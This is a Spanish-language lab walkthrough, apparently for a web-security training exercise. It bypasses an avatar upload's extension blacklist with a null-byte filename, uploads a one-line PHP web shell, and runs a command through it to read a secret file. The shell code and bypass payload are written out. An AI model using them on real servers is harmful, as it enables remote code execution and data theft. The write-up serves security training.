# 📤 Web shell upload mediante ofuscación de extensión con null byte

## 📄 Descripción del laboratorio

El laboratorio restringe la subida de avatares a extensiones de imagen (`.jpg` y `.png`) mediante una **blacklist básica**.

Esta validación puede eludirse explotando el comportamiento histórico de ciertas configuraciones **PHP/Apache** ante la presencia de un **null byte (`%00`)**.

El objetivo es:

* Subir una **web shell PHP disfrazada con una extensión permitida**.
* Ejecutarla para leer el archivo:

```
/home/carlos/secret
```

* Enviar dicho secreto mediante el botón del banner para completar el laboratorio.

Credenciales de prueba:

```
wiener:peter
```



## 📚 Teoría

Las validaciones de extensión basadas únicamente en el **nombre del archivo** pueden ser vulnerables cuando el backend interpreta el **null byte (`\0`) como terminador de cadena**.

En versiones antiguas de PHP o configuraciones legacy ocurre lo siguiente:

* La **validación** ve el nombre completo del archivo.
* El **sistema de archivos** trunca la cadena al encontrar `%00`.
* Todo lo que aparece después del null byte **se ignora**.

### 📌 Ejemplo clave

Nombre enviado:

```
shell.php%00.jpg
```

Interpretación:

* Validación: detecta `.jpg` → permitido
* Sistema de archivos: trunca el nombre → `shell.php`
* Apache/PHP: ejecuta el archivo como **PHP**

Resultado: **Remote Code Execution (RCE)**.

Aunque esta técnica está mitigada en versiones modernas de PHP, todavía puede encontrarse en:

* Entornos **legacy**
* Aplicaciones **antiguas**
* Configuraciones **mal actualizadas**

Por este motivo sigue siendo una técnica relevante en auditorías de **file upload vulnerabilities**.



## 📝 Práctica

### 🎯 Objetivo

Leer el archivo:

```
/home/carlos/secret
```



### 1️⃣ Iniciar sesión

Accedemos a la aplicación con las credenciales:

```
wiener:peter
```

Después navegamos a:

**My Account → Upload avatar**



### 2️⃣ Confirmar la restricción

Intentamos subir directamente una web shell:

```php
<?php system($_GET['cmd']); ?>
```

<img width="728" height="144" alt="image" src="https://github.com/user-attachments/assets/57d54c6a-a48d-4207-8bba-ede885cf8772" />
<br>

Resultado:

El servidor rechaza el archivo con un mensaje similar a:

```
Only .jpg or .png files are allowed
```

Esto confirma que existe una **validación basada en la extensión del archivo**.



### 3️⃣ Preparar la web shell

Creamos una shell básica:

```php
<?php system($_GET['cmd']); ?>
```

Inicialmente la guardamos como:

```
shell.php.jpg
```

Si la subida directa no funciona, utilizamos una manipulación manual de la petición.



### 4️⃣ Inyección de null byte

Interceptamos la petición de subida con **Burp Suite** y modificamos el nombre del archivo:

```
shell.php%00.jpg
```

El valor `%00` representa el **null byte codificado en URL**.

Comportamiento resultante:

* La validación detecta `.jpg` y acepta el archivo.
* El backend trunca el nombre en `shell.php`.

<img width="1300" height="712" alt="image" src="https://github.com/user-attachments/assets/e9c6638a-a8c0-49b9-89e7-9142fba5450e" />
<br>

Resultado:

La subida se realiza correctamente.



### 5️⃣ Leer el secreto

Una vez subida la web shell, accedemos a:

```
/files/avatars/shell.php?cmd=cat /home/carlos/secret
```

El servidor ejecuta el comando y devuelve el contenido del archivo.

### 6️⃣ Resolver el laboratorio

Copiamos el valor obtenido y lo enviamos mediante el botón del banner del laboratorio.

El laboratorio queda resuelto correctamente.
